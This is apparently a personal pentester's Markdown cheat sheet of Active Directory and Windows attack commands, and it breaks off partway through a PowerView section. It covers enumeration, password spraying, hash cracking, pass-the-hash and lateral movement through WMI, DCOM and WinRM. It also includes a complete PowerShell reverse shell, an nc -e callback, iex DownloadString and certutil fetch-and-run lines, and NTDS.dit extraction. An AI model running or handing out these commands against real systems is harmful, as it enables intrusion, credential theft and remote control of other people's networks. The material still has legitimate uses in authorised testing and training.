# TOC
- [Tools](#tools)
- [URLs](#urls)
- [Training](#training)
- [OSINT](#osint)
- [setup](#setup)
- [Hashcat](#hashcat)
- [John](#john)
- [xfreerdp](#xfreerdp)
- [remmina](#remmina)
- [ssh](#ssh)
- [socat](#socat)
- [TFTP](#tftp)
- [scp](#scp)
- [nmap](#nmap)
- [fping](#fping)
- [enum4linux](#enum4linux)
- [enum4linux-ng](#enum4linux-ng)
- [tcpdump](#tcpdump)
- [Responser](#responder)
- [ffuf](#ffuf)
- [nc](#nc)
- [netstat](#netstat)
- [ss](#ss)
- [Windows Built-In](#windows-built-in)
- [Powerview](#powerview)
- [Metasploit](#metasploit)
- [setspn](#setspn)
- [samba](#samba)
  - [smbclient](#smbclient)
  - [rpcclinet](#rpcclient)
- [mimikatz](#mimikatz)
- [Rebeus](#rebeus)
- [crackmapexec](#crackmapexec)
- [kerbrute](#kerbrute)
- [impacket](#impacket)
  - [GetNPUsers.py](#getnpuserspy)
  - [GetUserSPNs.py](#getuserspnspy)

---
# Read
- [MS Docs - Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)

# Tools
https://github.com/GhostPack/Seatbelt  
https://github.com/funoverip/mcafee-sitelist-pwd-decryption  
https://github.com/wavestone-cdt/powerpxe/blob/master/PowerPXE.ps1  
https://github.com/wavestone-cdt/powerpxe/tree/master  
https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/  
https://github.com/cube0x0/CVE-2021-1675/tree/main  
https://pypi.org/project/requests-ntlm/  

# URLs
https://zsh-prompt-generator.site/
https://bash-prompt-generator.org/
https://wadcoms.github.io/

- shell
https://explainshell.com/

- Windows Server Core
https://learn.microsoft.com/ja-jp/windows-server/administration/server-core/what-is-server-core

- Get-Service
https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.4

- vnstat command
https://humdi.net/vnstat/

- Attack
- [SAM Name impersonation](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699)
[CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
- [CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)
- [NoPac](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)
- [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)
- [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)
- [NTLM relaying to AD CS and the PetitPotam attack](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
- [Whitepaper Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
Exchange-AD-Privesc
- [MS-PRN Printer Bug. ](https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/)

- EyeWitness
EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
https://github.com/RedSiege/EyeWitness
https://www.christophertruncer.com/eyewitness-2-0-release-and-user-guide/

- DREAD_(risk_assessment_model)
https://en.wikipedia.org/wiki/DREAD_(risk_assessment_model)

- Nessus Attack Scripting Language
https://en.wikipedia.org/wiki/Nessus_Attack_Scripting_Language

- Filesystem Hierarchy Standard (FHS)
https://www.pathname.com/fhs/

---

# Traning
## GOAD
https://github.com/Orange-Cyberdefense/GOAD

---
# Memo
![png](https://i.imgur.com/JSxaYVX.png)

---
# Online Cheatsheet
- [GTFOBins](https://gtfobins.github.io/)

---

# OSINT
- https://haveibeenpwned.com/

## spiderfoot
https://github.com/smicallef/spiderfoot

---

# setup
- impacket
```
$ pa3
$ pip install impacket
# test
$ secretsdump.py -h
$ which secretsdump.py
```
- python
```zsh
$ pip install requests-ntlm
```

- slapd(OpenLDAP)
```zsh
$ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

- remmina
https://remmina.org/how-to-install-remmina/
```zsh
$ sudo apt install remmina remmina-plugin-rdp remmina-plugin-secret
```

---
# Google
```
filetype:pdf inurl:hoge.com
```
```
intext:"@hoge.com" inurl:hoge.com
```
# nslookup
```zsh
$ nslookup ns1.hoge.com
```

# dehashed
- https://www.dehashed.com/
```zsh
$ python3 dehashed.py -q hoge.local -p
```

# statistically-likely-usernames
tag: list
https://github.com/insidetrust/statistically-likely-usernames

# Exploit DB
https://www.exploit-db.com/

# Hashcat
tag: Misc
[example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
```zsh
$ hashcat -m 13100 TestUser_tgs /usr/share/wordlists/rockyou.txt
$ hashcat -m 5600 TestUser_ntlmv2 /usr/share/wordlists/rockyou.txt
$ echo "testuser::HOGEDOMAIN:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
$ hashcat -m 5600 ./testuser_hash /usr/share/wordlists/rockyou.txt
$ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
$ hashcat -m 13100 -a 0 ./GetUserSPNs-py_hashcat.txt ./TestPasswordList.txt
# AS-REP roast
$ hashcat -m 18200 output_GetNPUsers.txt /usr/share/wordlists/rockyou.txt
# DCSync
$ hashcat -m 1000 outout_mimikatz_dcsync_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

# John
tag: Misc

# xfreerdp
tag: RDP
```zsh
$ xfreerdp /v:XXX.XXX.XXX.XXX /u:TestUser /p:TestPassword /dynamic-resolution +clipboard
$ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:TestPassword /dynamic-resolution
$ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:'P@$$W0rd' /dynamic-resolution
# bad
## $ has a special meaning
## $ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:P@$$W0rd /dynamic-resolution
```
`/dynamic-resolution` option may not work well.

# Remmina
tag: RDP
```zsh
$ remmina -c rdp://TestUser@XXX.XXX.XXX.XXX
```

# ssh
```zsh
$ ssh TestUser@XXX.XXX.XXX.XXX
$ ssh HOGE.com\\TestUser@TestHost.HOGE.com
$ ssh TestUser@XXX.XXX.XXX.XXX -R 8888:TestHost.HOGE.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

# socat
```zsh
$ socat TCP4-LISTEN:13514,fork TCP4:TestTargetHost.HOGE.com:3389
```

# chisel
```zsh
$ chisel_1.9.1_linux_amd64 server -p 8000 --reverse
PS> c:\chisel client XXX.XXX.XXX.XXX:8000 R:socks
PS> c:\chisel client XXX.XXX.XXX.XXX:8000 R:5002:socks
# sudo vim /etc/proxychains4.conf
## socks5 	127.0.0.1 5000
# proxychains4 psexec.py HOGE.COM/TestUser:TestPassword@XXX.XXX.XXX.XXX
```

# TFTP
```zsh
$ tftp -i XXX.XXX.XXX.XXX GET "\Tmp\x64{8A98E259-D569-5C1B-A098-986F5B5736FF}.bcd" conf.bcd
$ tftp -i XXX.XXX.XXX.XXX GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
```

# scp
```zsh
$ scp TestUser@HOGE.com:C:/Users/TestUser/Documents/20240518062907_BloodHound.zip .
```

# nmap
```zsh
$ sudo nmap XXX.XXX.XXX.XXX -p49555 -sV
$ sudo nmap XXX.XXX.XXX.XXX -A -sV -sC -p-
$ sudo nmap XXX.XXX.XXX.XXX -A -sV -sC -p8080
$ sudo nmap -sV -sC -p139,445 172.16.5.5
$ sudo nmap -sV -sC -p 0-10000 172.16.5.5
$ sudo nmap -A -p- 172.16.5.5
$ sudo nmap -sV -p- 172.16.5.130
$ sudo nmap -sV -p- 172.16.5.225
$ sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

# fping
tag: ICMP
```zsh
$ fping -asgq 172.16.5.0/23
```

# enum4linux
```zsh
# sudo echo 172.16.0.10 hoge.com >> /etc/hosts
$ enum4linux -a hoge.com | tee output_enum4linux_a_hoge-com.ans
$ enum4linux -a XXX.XXX.XXX.XXX | tee output_enum4linux_a_ip.ans
$ enum4linux -P XXX.XXX.XXX.XXX
$ enum4linux -U XXX.XXX.XXX.XXX | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

# enum4linux-ng
```zsh
$ enum4linux-ng -P 172.16.0.10 -oA my_output
$ cat my_output.json
```

# tcpdump  
tag: Initial Enumeration  
```zsh
$ sudo tcpdump -i ens224
```

# Responder  
tag: Initial Enumeration  
```zsh
$ sudo responder -I ens224 -A
$ sudo responder -I ens224
```

# ffuf  
```zsh
$ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
```

# nc  
tag: LDAP Pass-back Attacks
```zsh
$ sudo nc -lvnp LPORT
$ nc -lvp 389
```

# netstat  
```zsh
$ netstat -tuln
```

# ss  
```zsh
$ ss -tuln
$ ss -tuln4 | grep LISTEN | grep -v 127.0.0.1 | wc -l
-t: Show TCP connections.
-u: Show UDP connections.
-l: Show only listening sockets.
-n: Show numerical addresses instead of resolving hostnames.
-4: IPv4
```

# ldapsearch
tag: LDAP
```zsh
$ ldapsearch -h 172.16.5.5 -x -b "DC=HOGE,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
$ ldapsearch -h 172.16.0.10 -x -b "DC=HOGE,DC=COM" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

# windapsearch
tag: LDAP
```zsh
$ ./windapsearch.py -h
$ ./windapsearch.py --dc-ip XXX.XXX.XXX.XXX -u "" -U
$ python3 windapsearch.py --dc-ip XXX.XXX.XXX.XXX -u TestSpnAccountUser -p TestSpnAccountPassword -PU
$ python3 windapsearch.py --dc-ip XXX.XXX.XXX.XXX -u TestUser@hoge.local -p TestPassword --da
```

# CrackMapExec
tag: SMB
```zsh
$ crackmapexec smb -h
$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --pass-pol
$ crackmapexec smb XXX.XXX.XXX.XXX --users
$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword
$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --users
$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --loggedon-users
$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --shares
$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword  -M spider_plus --share 'Test Shares'
$ head -n 10 /tmp/cme_spider_plus/XXX.XXX.XXX.XXX.json
$ set +H
$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --groups
$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u valid_users.txt -p TestPasseord | grep +
$ sudo crackmapexec smb --local-auth XXX.XXX.XXX.XXX/23 -u administrator -H TestNTLMhash | grep +
$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u administrator -H TestNTLMhash
```

# smbmap
tag: SMB, Share
```zsh
$ smbmap -u TestUser -p TestPassword -d HOGE.LOCAL -H XXX.XXX.XXX.XXX
$ smbmap -u TestUser -p TestPassword -d HOGE.LOCAL -H XXX.XXX.XXX.XXX -R 'Test Shares' --dir-only
```


# kerbrute
tag: Enumerating Users
```zsh
$ kerbrute userenum -d HOGE.local --dc 172.16.0.10 mylist.txt -o valid_ad_users
# $ sudo echo 1721.16.0.10 HOGE.com >> /etc/hosts
$ kerbrute userenum --dc HOGE.com -d HOGE.com ./userlist.txt
$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt
$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt > result.txt
$ cat result.txt | awk -F " " '{printf("%s\n", $7)}' | grep @ | sed 's/@inlanefreight\.local//' > valid_users.txt
# password spray
$ kerbrute passwordspray -d hoge.local --dc XXX.XXX.XXX.XXX valid_users.txt TestPassword
```

# DomainPasswordSpray
```powershell
PS > Import-Module .\DomainPasswordSpray.ps1
PS > Invoke-DomainPasswordSpray -Password TestPassword -OutFile spray_success -ErrorAction SilentlyContinue
```

# LAPSToolkit
https://github.com/leoloobeek/LAPSToolkit/tree/master
```powershell
PS> Find-LAPSDelegatedGroups
PS> Find-AdmPwdExtendedRights
PS> Get-LAPSComputers
```

# Windows Built-In
```powershell
# one line
PS> powershell -nop -c "powershell command; powershell command...;"
PS> powershell -command "Start-Process -Verb runas cmd"
# basic
PS> hostname
PS> [System.Environment]::OSVersion.Version
PS> wmic qfe get Caption,Description,HotFixID,InstalledOn
PS> Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumb
PS> ipconfig /all
PS> systeminfo
command prompt> set
command prompt> echo %USERDOMAIN%
command prompt> echo %logonserver%
PS> Get-Module
PS> Get-ExecutionPolicy -List
PS> Set-ExecutionPolicy Bypass -Scope Process
PS> Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
PS> Get-ChildItem Env: | ft Key,Value
# stealth
PS> Get-host
PS> powershell.exe -version 2
PS> Get-host
PS> get-module
# check user
PS> whoami /user
PS> whoami /priv
PS> Get-LocalUser
# Group
PS> Get-LocalGroup
# check loggedon
PS> qwinsta
# check OS
PS> wmic os list brief
# check Network
PS> arp -a
PS> ipconfig /all
PS> route print
PS> netsh advfirewall show state
# check alias
PS> get-alias | sls "*ipconfig*"
PS> Get-Alias | select -First 2
PS> Get-Alias | Where-Object { $_.Name -like '*ipconfig*' }
# check process
command prompt> tasklist | findstr "calc"
PS> Get-Process | Where-Object { $_.Name -like "*calc*"}
# check memory cache about tgt
PS> klist
PS> klist tgt
# delete memory cache
PS> klist purge
# find a specific folder
PS> tree c:\
PS> tree c:\ /f | more
PS> tree c:\ /f | Select-String "TestString" -context 20, 10
# firewall check
PS> netsh advfirewall show allprofiles
# Enumerating Security Controls
PS> sc.exe query windefend
PS> Get-MpComputerStatus
PS> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
PS> $ExecutionContext.SessionState.LanguageMode
# create credential
PS> $username = 'TestAdminUser'
PS> $password = 'TestAdminPassword'
PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS> $SecPassword = ConvertTo-SecureString 'TestNewPassword' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $SecPassword)
# access
PS> New-PSSession -ComputerName TestHost.HOGE.com
PS> Enter-PSSession -ComputerName TestHost.HOGE.com
PS> Enter-PSSession -Computername TARGET -Credential $credential
## or
PS> Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
# download
PS> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
# Reverse Shell
PS> $client = New-Object System.Net.Sockets.TCPClient('XXX.XXX.XXX.XXX',RPORT);
PS> $stream = $client.GetStream()
PS> [byte[]]$bytes = 0..65535|%{0}
PS> while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.PS> ASCIIEncoding).GetString($bytes,0, $i)
PS> $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' +  (pwd).Path + '> '
PS> $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
PS> $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
# Reverse Shell - One Line
PS> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.1.5,888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
# List SIDs for local users
PS> Get-WmiObject Win32_UserAccount | Select-Object Name, SID
# List SIDs for local groups
PS> Get-WmiObject Win32_Group | Select-Object Name, SID
# privilege check
PS> whoami /priv
# check ACL
PS> $sharedFolderPath = 'C:\Users\TestUser\TestShareFolder';
PS> icacls $sharedFolderPath /inheritance:r
PS> icacls .\"TestFolder"
PS> icacls c:\windows
PS> icacls c:\users
PS> $securityGroupName = 'TestGroup'
PS> icacls $sharedFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"
# Service
PS> Get-Service
PS> Get-Service | ? {$_.DisplayName -like "*Hoge*"}
PS> Get-Service | ? {$_.Status -eq "Running"} | select -First 2 | fl
PS> Get-Service | ? {$_.Name -like "*Update*"} | select -First 2 | fl
PS> Get-Service | ? {$_.Status -eq "Running"} | echo | sls "update"
PS> Get-Service | ? {$_.DisplayName -like "*Update*"} | select -First 4 | fl
PS> Get-Service -Name HogeService | fl
# Share
PS> Get-WmiObject Win32_Share | Select-Object Name, Path
PS> Get-SmbShare | Select-Object Name, Path
PS> New-Item -ItemType Directory -Path .\"TestShareFolder"
PS> New-SmbShare -Path .\ -Name "TestShareFolder"
PS> New-SmbShare -Path c:\ -Name "TestShareFolder" -FullAccess 'Everyone'
PS> New-SmbShare -Path C:\Users\TestUser\"TestShareFolder" -Name "TestShareFolder" -FullAccess 'Everyone'
## Specify the shared folder path and name
PS> $sharedFolderPath = 'C:\Users\TestUser\TestShareFolder'
PS> $shareName = 'TestShareName'
PS> $securityGroupName = 'TestGroup'
## Remove the default group from the share permissions
PS> Remove-SmbShare -Name $shareName -Force
## Create a new shared folder with specific permissions
PS> New-SmbShare -Path $sharedFolderPath -Name $shareName -ChangeAccess $securityGroupName -ReadAccess $securityGroupName
## Add the security group to the existing shared folder
### The Add-SmbShareAccess cmdlet is available on Windows Server editions and not on regular Windows client editions.
### If you are using a Windows client version, you can use the net share and icacls commands to achieve the same result.
PS> Add-SmbShareAccess -Name $shareName -AccountName $securityGroupName -AccessRight Change
PS> net share $shareName=$sharedFolderPath "/grant:$securityGroupName,change"
# Create a new local user
PS> New-LocalUser -Name $username -Password $password -FullName 'Test' -Description 'Description of the new user' -AccountNeverExpires
# local security group
PS> $groupName = 'TestNewGroup'
PS> New-LocalGroup -Name $groupName -Description 'Description of the new group'
PS> Add-LocalGroupMember -Group $groupName -Member 'TestUser'
# load credential to memory
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "TestSvc/TestHost.hoge. local:1433"
# Shell
PS> $username = 'TestUser'
PS> $password = 'TestPassword'
PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS> $Opt = New-CimSessionOption -Protocol DCOM
PS> $Session =  New-Cimsession -ComputerName TestComputerHost.HOGE.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
# Shell
PS> $username = 'TestUser'
PS> $password = 'TestPassword'
PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS> New-PSSession -ComputerName XXX.XXX.XXX.XXX -Credential $credential
# Shell
PS> $password = ConvertTo-SecureString "TestUser" -AsPlainText -Force
PS> $cred = new-object System.Management.Automation.PSCredential ("HOGE\TestUser", $password)
PS> Enter-PSSession -ComputerName TargetComputer -Credential $cred
# Shell
PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("TargetHost", "XXX.XXX.XXX.XXX"))
PS> $dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")
PS> $dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -e aaaaaaaaaa", "7")
# Workaround Kerberos "Double Hop" Problem
## Register PSSession Configuration
### When the session cannot access the DC directly using PowerView
### https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2
PS> Enter-PSSession -ComputerName TargetComputer.HOGE.COM -Credential hoge\TestUser
Remote Accessed PS> klist
#### the result show you cannot access DC with the current credential status
PS> Register-PSSessionConfiguration -Name TestUserSession -RunAsCredential hoge\TestUser
#### restart the WinRM service
PS> Enter-PSSession -ComputerName TargetComputer -Credential hoge\TestUser -ConfigurationName TestUserSession
Remote Accessed PS> klist
#### ok
##### powerview
##### #Remote Accessed PS> import-module .\PowerView.ps1
##### #Remote Accessed PS> get-domainuser -spn | select samaccountname
# Web Access
PS> iwr -UseDefaultCredentials http://TestWeb
# Memo
PS> if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs; exit }
```
## runas
```powershell
PS> runas /netonly /user:HOGE.com\TestUser cmd.exe
PS> runas /netonly /user:HOGE.com\TestUser "c:\tools\nc64.exe -e cmd.exe XXX.XXX.XXX.XXX 4443"
```

## Module: ActiveDirectory
```powershell
PS> Get-Module
PS> Import-Module ActiveDirectory
PS> Get-Module
# Domain
PS> Get-ADDomain
# User
PS> Get-ADUser -Identity TestUser -Properties *
PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
PS> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
PS> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
# Group
PS> Get-ADGroup -Filter * | select name
PS> Get-ADGroup -Identity "Backup Operators"
PS> Get-ADGroup -Identity "Enterprise Admins" -Properties * | Out-String | Select-String sid
PS> Get-ADGroup -Identity "Test Group" -Properties * | Select -ExpandProperty Members
PS> Get-ADGroupMember -Identity "Backup Operators"
PS> $SecPassword = ConvertTo-SecureString 'TestPassword' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $SecPassword)
PS> Add-DomainGroupMember -Identity 'Test Group' -Members 'TargetUser' -Credential $Cred -Verbose
# check object
PS> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1163"
PS> Get-ObjectAcl "DC=hoge,DC=com" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier,ObjectAceType | fl
# Change Password
PS> $Password = ConvertTo-SecureString "NewTestPassword" -AsPlainText -Force
PS> Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
# Active Directory Object
PS> $ChangeDate = New-Object DateTime(2024, 01, 24, 12, 00, 00)
PS> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server HOGE.com
# Trust
PS> Get-ADTrust -Filter *
# ACE
PS> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
PS> foreach($line in [System.IO.File]::ReadLines("C:\Users\TestUser\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'HOGE\\TargetUser'}}
```
## sc.exe
```powershell
PS> sc.exe \\TestHost/HOGE.com create TestService binPath= "%windir%\TestService.exe" start= auto
```
## winrs.exe
```powershell
PS> winrs -r:TargetComputer -u:TestUser -p:TestPassword "cmd /c hostname & whoami"
PS> winrs -r:XXX.XXX.XXX.XXX -u:TestUser -p:TestPassword "cmd /c hostname & whoami"
PS> winrs -r:TargetComputer -u:TestUser -p:TestPassword "powershell -nop -w hidden -e aaaaaaaaaaaaaaaaaaaaaa"
# $ nc -lvp 443
```
## certutil.exe
```powershell
PS> certutil.exe -urlcache -split -f http://XXX.XXX.XXX.XXX:443/shell.ps1
```
## WMI
- https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4  
- https://learn.microsoft.com/en-us/windows/win32/wmisdk/using-wmi
```powershell
PS> wmic qfe get Caption,Description,HotFixID,InstalledOn
PS> wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
PS> wmic process list /format:list
PS> wmic ntdomain list /format:list
PS> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
PS> wmic useraccount list /format:list
PS> wmic group list /format:list
PS> wmic sysaccount list /format:list
# remote process call
PS> wmic /node:XXX.XXX.XXX.XXX /user:TestUser /password:TestPassword process call create "calc"
# shell
PS> $username = 'TestAdminUser'
PS> $password = 'TestAdminPassword'
PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS> $options = New-CimSessionOption -DCOM
PS> $session = New-CimSession -ComputerName XXX.XXX.XXX.XXX -Credential $credential -SessionOption $Options
PS> $command = 'calc'
PS> Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine -$Command}
```
## net.exe
```zsh
$ net accounts
$ net accounts /domain
$ net group /domain
$ net group "Domain Admins" /domain
$ net group "Domain Controllers" /domain
$ net group "TestGroup" /domain
$ net groups /domain
$ net localgroup
$ net localgroup administrators /domain
$ net localgroup Administrators
$ net localgroup administrators TestUser /add
$ net share
$ net user TestUser /domain
$ net user /domain TestUser
$ net user /domain
$ net user %username%
$ net use x: \computer\share
$ net view
$ net view /all /domain:hoge.local
$ net view \computer /ALL
$ net view /domain
$ net use \\DC01\ipc$ "" /u:""
$ net use \\DC01\ipc$ "" /u:TestUser
$ net use \\DC01\ipc$ "TestPassword" /u:TestUser
# userful for bypassing string restriction
$ net1 user
```
## Dsquery  
- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)
- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)
- [User Account Control (UAC) attributes](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
- [LDAP OID Reference Guide](https://ldap.com/ldap-oid-reference-guide/)
- [OID: 1.2.840.113556.1.4.803](https://learn.microsoft.com/ja-jp/openspecs/windows_protocols/ms-adts/4e638665-f466-4597-93c4-12f2ebfabab5)
- [Search Filter Syntax](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax)
```powershell
PS> dsquery user
PS> dsquery computer
PS> dsquery * "CN=Users,DC=HOGE,DC=LOCAL"
PS> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr description
PS> dsquery * domainroot -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr description
PS> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
## WinRM
tag: remote access
```powershell
PS> winrs.exe -u:TestAdminUser -p:TestAdminPassword -r:TargetIP_or_Hostname cmd
```
## setspn
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
```powershell
PS> setspn.exe -Q */*
PS> setspn.exe -Q vmware/HOGE.clocal
PS> setspn.exe -T HOGE.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
## vsshadow.exe
```powershell
PS> vshadow.exe -nw -p C:
PS> copy \\?\GLOBALROOT\Device\HarddiskShadowVolumeCopy1\windows\ntds\ntds.dit c:\ntds.dit.bak
PS> reg.exe save hklm\system c:\system.bak
```


# PowerView  
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
```powershell
PS> Import-Module .\PowerView.ps1
PS> Get-DomainPolicy
# User
PS> Get-DomainUser -Identity TestUser | select samaccountname,objectsid,memberof,useraccountcontrol | fl
PS> Get-DomainUser -Identity TestUser -Domain hoge.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
## Checking for Reversible Encryption Option 
